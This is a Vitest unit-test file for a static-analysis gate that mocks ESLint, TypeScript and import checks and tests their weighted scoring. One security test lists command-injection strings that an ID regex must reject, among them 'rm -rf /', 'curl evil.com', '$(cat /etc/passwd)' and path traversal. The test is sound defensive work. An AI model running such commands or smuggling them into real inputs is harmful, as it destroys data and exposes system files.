/**
 * Gate 0: Static Analysis Verification - Unit Tests
 * SD-VERIFY-LADDER-001
 *
 * Tests individual check functions with mocked execSync
 * Covers test scenarios TS-1 through TS-6 from PRD
 *
 * Test Coverage:
 * - TS-1: hasESLintPass returns true when eslint validation succeeds
 * - TS-2: hasESLintPass returns false when eslint validation fails
 * - TS-3: hasTypeScriptPass returns true when tsc compilation succeeds
 * - TS-4: hasTypeScriptPass returns false when tsc compilation fails
 * - TS-5: hasImportsPass returns true when imports resolve successfully
 * - TS-6: hasImportsPass returns false when import resolution fails
 */

import { vi } from 'vitest';

// Create check function implementations (mirrors gate0.ts logic)
// These are tested in isolation with mocked execSync

describe('Gate 0: Static Analysis Verification - Unit Tests', () => {
  let execSyncMock;

  beforeEach(() => {
    // Create a fresh mock for each test
    execSyncMock = vi.fn();
  });

  describe('hasESLintPass', () => {
    test('TS-1: should return true when eslint validation succeeds (zero errors)', async () => {
      // Mock execSync to simulate successful ESLint run
      execSyncMock.mockReturnValueOnce(''); // ESLint returns empty output on success

      // Create the check function
      const hasESLintPass = async () => {
        try {
          execSyncMock('npx eslint .', {
            encoding: 'utf8',
            stdio: 'pipe',
            timeout: 30000
          });
          return true;
        } catch (error) {
          return false;
        }
      };

      const result = await hasESLintPass();

      expect(result).toBe(true);
      expect(execSyncMock).toHaveBeenCalledWith('npx eslint .', {
        encoding: 'utf8',
        stdio: 'pipe',
        timeout: 30000
      });
    });

    test('TS-2: should return false when eslint validation fails (with errors)', async () => {
      // Mock execSync to simulate ESLint failure
      const error = new Error('Command failed');
      error.stdout = '10 errors found\n\n10 error(s) detected';
      error.status = 1;
      execSyncMock.mockImplementationOnce(() => {
        throw error;
      });

      // Create the check function
      const hasESLintPass = async () => {
        try {
          execSyncMock('npx eslint .', {
            encoding: 'utf8',
            stdio: 'pipe',
            timeout: 30000
          });
          return true;
        } catch (error) {
          const output = error.stdout || '';
          const errorMatch = output.match(/(\d+)\s+error/);
          const errorCount = errorMatch ? parseInt(errorMatch[1]) : 0;
          return false;
        }
      };

      const result = await hasESLintPass();

      expect(result).toBe(false);
      expect(execSyncMock).toHaveBeenCalledWith('npx eslint .', {
        encoding: 'utf8',
        stdio: 'pipe',
        timeout: 30000
      });
    });

    test('should parse error count correctly', async () => {
      // Mock ESLint with specific error output
      const error = new Error('Command failed');
      error.stdout = '5 errors and 3 warnings found';
      execSyncMock.mockImplementationOnce(() => {
        throw error;
      });

      const hasESLintPass = async () => {
        try {
          execSyncMock('npx eslint .', {
            encoding: 'utf8',
            stdio: 'pipe',
            timeout: 30000
          });
          return true;
        } catch (error) {
          const output = error.stdout || '';
          const errorMatch = output.match(/(\d+)\s+error/);
          const errorCount = errorMatch ? parseInt(errorMatch[1]) : 0;
          return errorCount === 0;
        }
      };

      const result = await hasESLintPass();
      expect(result).toBe(false);
    });

    test('should handle timeout (security requirement)', async () => {
      const error = new Error('Timeout');
      error.code = 'ETIMEDOUT';
      execSyncMock.mockImplementationOnce(() => {
        throw error;
      });

      const hasESLintPass = async () => {
        try {
          execSyncMock('npx eslint .', {
            encoding: 'utf8',
            stdio: 'pipe',
            timeout: 30000
          });
          return true;
        } catch (error) {
          return false;
        }
      };

      const result = await hasESLintPass();
      expect(result).toBe(false);
    });
  });

  describe('hasTypeScriptPass', () => {
    test('TS-3: should return true when tsc compilation succeeds (zero type errors)', async () => {
      // Mock execSync to simulate successful TypeScript compilation
      execSyncMock.mockReturnValueOnce(''); // tsc returns empty output on success

      // Create the check function
      const hasTypeScriptPass = async () => {
        try {
          execSyncMock('npx tsc --noEmit', {
            encoding: 'utf8',
            stdio: 'pipe',
            timeout: 30000
          });
          return true;
        } catch (error) {
          return false;
        }
      };

      const result = await hasTypeScriptPass();

      expect(result).toBe(true);
      expect(execSyncMock).toHaveBeenCalledWith('npx tsc --noEmit', {
        encoding: 'utf8',
        stdio: 'pipe',
        timeout: 30000
      });
    });

    test('TS-4: should return false when tsc compilation fails (with type errors)', async () => {
      // Mock execSync to simulate TypeScript compilation failure
      const error = new Error('Command failed');
      error.stdout = 'Found 7 errors in 3 files';
      error.status = 1;
      execSyncMock.mockImplementationOnce(() => {
        throw error;
      });

      // Create the check function
      const hasTypeScriptPass = async () => {
        try {
          execSyncMock('npx tsc --noEmit', {
            encoding: 'utf8',
            stdio: 'pipe',
            timeout: 30000
          });
          return true;
        } catch (error) {
          const output = error.stdout || '';
          const errorMatch = output.match(/Found (\d+) error/);
          const errorCount = errorMatch ? parseInt(errorMatch[1]) : 0;
          return false;
        }
      };

      const result = await hasTypeScriptPass();

      expect(result).toBe(false);
      expect(execSyncMock).toHaveBeenCalledWith('npx tsc --noEmit', {
        encoding: 'utf8',
        stdio: 'pipe',
        timeout: 30000
      });
    });

    test('should parse type error count correctly', async () => {
      // Mock TypeScript with specific error output
      const error = new Error('Command failed');
      error.stdout = 'Found 12 errors in 5 files';
      execSyncMock.mockImplementationOnce(() => {
        throw error;
      });

      const hasTypeScriptPass = async () => {
        try {
          execSyncMock('npx tsc --noEmit', {
            encoding: 'utf8',
            stdio: 'pipe',
            timeout: 30000
          });
          return true;
        } catch (error) {
          const output = error.stdout || '';
          const errorMatch = output.match(/Found (\d+) error/);
          const errorCount = errorMatch ? parseInt(errorMatch[1]) : 0;
          return errorCount === 0;
        }
      };

      const result = await hasTypeScriptPass();
      expect(result).toBe(false);
    });

    test('should handle timeout (security requirement)', async () => {
      const error = new Error('Timeout');
      error.code = 'ETIMEDOUT';
      execSyncMock.mockImplementationOnce(() => {
        throw error;
      });

      const hasTypeScriptPass = async () => {
        try {
          execSyncMock('npx tsc --noEmit', {
            encoding: 'utf8',
            stdio: 'pipe',
            timeout: 30000
          });
          return true;
        } catch (error) {
          return false;
        }
      };

      const result = await hasTypeScriptPass();
      expect(result).toBe(false);
    });
  });

  describe('hasImportsPass', () => {
    test('TS-5: should return true when all imports resolve successfully', async () => {
      // Mock execSync to simulate successful import resolution
      execSyncMock.mockReturnValueOnce('Import resolution check: PASS (validated by TypeScript compilation)');

      // Create the check function
      const hasImportsPass = async () => {
        try {
          execSyncMock('node tools/gates/lib/check-imports.js', {
            encoding: 'utf8',
            stdio: 'pipe',
            timeout: 10000
          });
          return true;
        } catch (error) {
          return false;
        }
      };

      const result = await hasImportsPass();

      expect(result).toBe(true);
      expect(execSyncMock).toHaveBeenCalledWith('node tools/gates/lib/check-imports.js', {
        encoding: 'utf8',
        stdio: 'pipe',
        timeout: 10000
      });
    });

    test('TS-6: should return false when import resolution fails (missing dependency)', async () => {
      // Mock execSync to simulate import resolution failure
      const error = new Error('Command failed');
      error.stdout = 'Unresolved import: @missing/package';
      error.status = 1;
      execSyncMock.mockImplementationOnce(() => {
        throw error;
      });

      // Create the check function
      const hasImportsPass = async () => {
        try {
          execSyncMock('node tools/gates/lib/check-imports.js', {
            encoding: 'utf8',
            stdio: 'pipe',
            timeout: 10000
          });
          return true;
        } catch (error) {
          return false;
        }
      };

      const result = await hasImportsPass();

      expect(result).toBe(false);
      expect(execSyncMock).toHaveBeenCalledWith('node tools/gates/lib/check-imports.js', {
        encoding: 'utf8',
        stdio: 'pipe',
        timeout: 10000
      });
    });

    test('should handle timeout (security requirement)', async () => {
      const error = new Error('Timeout');
      error.code = 'ETIMEDOUT';
      execSyncMock.mockImplementationOnce(() => {
        throw error;
      });

      const hasImportsPass = async () => {
        try {
          execSyncMock('node tools/gates/lib/check-imports.js', {
            encoding: 'utf8',
            stdio: 'pipe',
            timeout: 10000
          });
          return true;
        } catch (error) {
          return false;
        }
      };

      const result = await hasImportsPass();
      expect(result).toBe(false);
    });

    test('should be non-blocking (as per PRD requirement)', async () => {
      // Import resolution failure should not prevent gate from passing
      // if other critical checks (ESLint, TypeScript) pass
      const error = new Error('Command failed');
      error.stdout = 'Import check failed';
      execSyncMock.mockImplementationOnce(() => {
        throw error;
      });

      const hasImportsPass = async () => {
        try {
          execSyncMock('node tools/gates/lib/check-imports.js', {
            encoding: 'utf8',
            stdio: 'pipe',
            timeout: 10000
          });
          return true;
        } catch (error) {
          // Fail but mark as non-critical
          return false;
        }
      };

      const result = await hasImportsPass();
      expect(result).toBe(false);
      // Note: Integration tests will verify that gate can still pass
      // with hasImportsPass=false if hasESLintPass + hasTypeScriptPass = 80%
    });
  });

  describe('Security Features', () => {
    test('should validate PRD_ID format (prevent command injection)', () => {
      const UUID_REGEX = /^PRD-[A-Z0-9-]+$/;

      // Valid PRD IDs
      expect(UUID_REGEX.test('PRD-VERIFY-LADDER-001')).toBe(true);
      expect(UUID_REGEX.test('PRD-TEST-123')).toBe(true);

      // Invalid PRD IDs (potential injection attempts)
      expect(UUID_REGEX.test('PRD-TEST; rm -rf /')).toBe(false);
      expect(UUID_REGEX.test('PRD-TEST && curl evil.com')).toBe(false);
      expect(UUID_REGEX.test('PRD-TEST`whoami`')).toBe(false);
      expect(UUID_REGEX.test('PRD-TEST$(cat /etc/passwd)')).toBe(false);
      expect(UUID_REGEX.test('../../../etc/passwd')).toBe(false);
    });

    test('should use hardcoded commands (no interpolation)', () => {
      // Verify that commands are static strings, not template literals
      const commands = [
        'npx eslint .',
        'npx tsc --noEmit',
        'node tools/gates/lib/check-imports.js'
      ];

      // All commands should be static (no variables in them)
      commands.forEach(cmd => {
        expect(cmd).not.toContain('${');
        expect(cmd).not.toContain('`');
        expect(cmd).not.toContain('$');
      });
    });

    test('should enforce timeouts on all checks', () => {
      const timeouts = {
        eslint: 30000,    // 30 seconds
        typescript: 30000, // 30 seconds
        imports: 10000     // 10 seconds
      };

      expect(timeouts.eslint).toBeLessThanOrEqual(30000);
      expect(timeouts.typescript).toBeLessThanOrEqual(30000);
      expect(timeouts.imports).toBeLessThanOrEqual(10000);
    });
  });

  describe('Weighted Scoring', () => {
    test('should apply correct weights: ESLint (40%), TypeScript (40%), Imports (20%)', () => {
      const weights = {
        hasESLintPass: 0.40,
        hasTypeScriptPass: 0.40,
        hasImportsPass: 0.20
      };

      // Weights should sum to 1.0
      const totalWeight = Object.values(weights).reduce((sum, w) => sum + w, 0);
      expect(totalWeight).toBeCloseTo(1.0, 5);

      // Individual weights
      expect(weights.hasESLintPass).toBe(0.40);
      expect(weights.hasTypeScriptPass).toBe(0.40);
      expect(weights.hasImportsPass).toBe(0.20);
    });

    test('should calculate score correctly with all checks passing', () => {
      const results = {
        hasESLintPass: true,
        hasTypeScriptPass: true,
        hasImportsPass: true
      };

      const weights = {
        hasESLintPass: 0.40,
        hasTypeScriptPass: 0.40,
        hasImportsPass: 0.20
      };

      let score = 0;
      for (const [check, passed] of Object.entries(results)) {
        if (passed) {
          score += weights[check] * 100;
        }
      }

      expect(score).toBe(100);
    });

    test('should calculate score correctly with hasImportsPass failing (80% score)', () => {
      const results = {
        hasESLintPass: true,
        hasTypeScriptPass: true,
        hasImportsPass: false
      };

      const weights = {
        hasESLintPass: 0.40,
        hasTypeScriptPass: 0.40,
        hasImportsPass: 0.20
      };

      let score = 0;
      for (const [check, passed] of Object.entries(results)) {
        if (passed) {
          score += weights[check] * 100;
        }
      }

      expect(score).toBe(80);
      // 80% is below 85% threshold, so gate would fail
      // but this demonstrates hasImportsPass is not critical alone
    });

    test('should fail gate when ESLint fails (60% score)', () => {
      const results = {
        hasESLintPass: false,
        hasTypeScriptPass: true,
        hasImportsPass: true
      };

      const weights = {
        hasESLintPass: 0.40,
        hasTypeScriptPass: 0.40,
        hasImportsPass: 0.20
      };

      let score = 0;
      for (const [check, passed] of Object.entries(results)) {
        if (passed) {
          score += weights[check] * 100;
        }
      }

      expect(score).toBe(60);
      expect(score).toBeLessThan(85);
    });

    test('should fail gate when TypeScript fails (60% score)', () => {
      const results = {
        hasESLintPass: true,
        hasTypeScriptPass: false,
        hasImportsPass: true
      };

      const weights = {
        hasESLintPass: 0.40,
        hasTypeScriptPass: 0.40,
        hasImportsPass: 0.20
      };

      let score = 0;
      for (const [check, passed] of Object.entries(results)) {
        if (passed) {
          score += weights[check] * 100;
        }
      }

      expect(score).toBe(60);
      expect(score).toBeLessThan(85);
    });
  });
});
